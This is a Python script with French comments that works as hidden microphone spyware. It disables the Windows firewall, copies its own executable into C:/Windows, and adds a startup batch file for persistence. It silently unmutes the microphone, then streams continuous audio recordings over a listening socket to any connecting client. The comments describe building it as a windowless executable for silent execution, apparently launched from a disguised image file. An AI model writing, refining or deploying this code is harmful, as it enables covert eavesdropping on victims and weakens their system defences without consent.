import win32api
import win32gui
import sounddevice as sd
import os, sys
import shutil
import socket                   
import mlsocket
import getpass


port = 60000                   
s = mlsocket.MLSocket()             
host = ''                           #
s.bind((host, port))            
s.listen(5)
# ***************************************ATTENTION!!!!*******************************************************************

    # LE SCRIPT PYTHON NE GENERE PAS L'EXECUTABLE
    # L'EXECUTABLE EST GENERER A PARTIR D UNE COMMANDE EXECUTER SUR L INVITE DE COMMANDE AVEC LE MODULE pyinstaller
    # LA COMMANDE EST LA SUIVANTE :
    # pyinstaller --onefile -w C:/..../MicControl.py
    # EXPLICATION DES ARG:
    # --onefile permet d'avoir tout dans un seul fichier .exe
    # -w permet de ne peut avoir de console lors de l'exe === ce qui permettera une execusion silencieuse

# ***********************************************************************************************************************
# Desactiver le Parefeu
import subprocess
subprocess.check_call('netsh.exe advfirewall set publicprofile state off')

# je verifie le path de l'excutable (Mic.exe)
# Si il s'execute a partir de l'image jpg dans ce cas il cree une copie dans un autre path
# SINON il fait rien

if os.path.dirname(sys.executable) != os.path.normpath("C:/Windows"): #Ces path sont juste pour le test
    shutil.move(sys.executable, os.path.normpath("C:/Windows"))
    print("loctaion changed")

# La fct qui permet de generer le batch file (.bat)
# qui a son tour va permettre au MicControl.exe de s'executer a chaque demarage de la machine


def add_to_startup(file_path=""):
    if file_path == "":
        user_name = getpass.getuser()
        file_path = os.path.normpath("C:/Windows/MicControl.exe")
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % user_name
    with open(bat_path + '\\' + "Microphone.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


# L'appel a la fct est en comntr parce que je l'ai deja testé et j ai pas envie de creer le .bat
add_to_startup("")

# On teste si le Mic est eteint
fs = 44100 #fréquence d'échantillonnage
sec = 10 #durée de l'enregistrement
record = sd.rec(int(sec * fs), samplerate=fs, channels=2)
sd.wait()

if (record[440998][0]==3.0517578125e-05 and record[440998][1]==0.0 and record[440999][0]==0.0 and record[440999][1]== -3.0517578125e-05): # On teste les vals recup avec les vals du record dans le cas Mute Mic
    print("Unmute Mic Starting .....")
    WM_APPCOMMAND = 0x319
    APPCOMMAND_MICROPHONE_VOLUME_MUTE = 0x180000
    hwnd_active = win32gui.GetForegroundWindow()
    win32api.SendMessage(hwnd_active, WM_APPCOMMAND, None, APPCOMMAND_MICROPHONE_VOLUME_MUTE)

# Si le Mic est en status Unmute en commence l'enregistement directement
print("Mic is On")
print("Recording Starting .....")

i = 0
conn, addr = s.accept()  # Establish connection with client.
print('Got connection from', addr)
data = conn.recv(1024)
print('Server received', repr(data))
fs = 44100  # fréquence d'échantillonnage
sec = 10  # durée de l'enregistrement
while True:

    print("session",i,"is starting")

    record = sd.rec(int(sec * fs), samplerate=fs, channels=2)
    sd.wait()

    conn.send(record)
    print("this session ended")
    i = i+1

print("End")

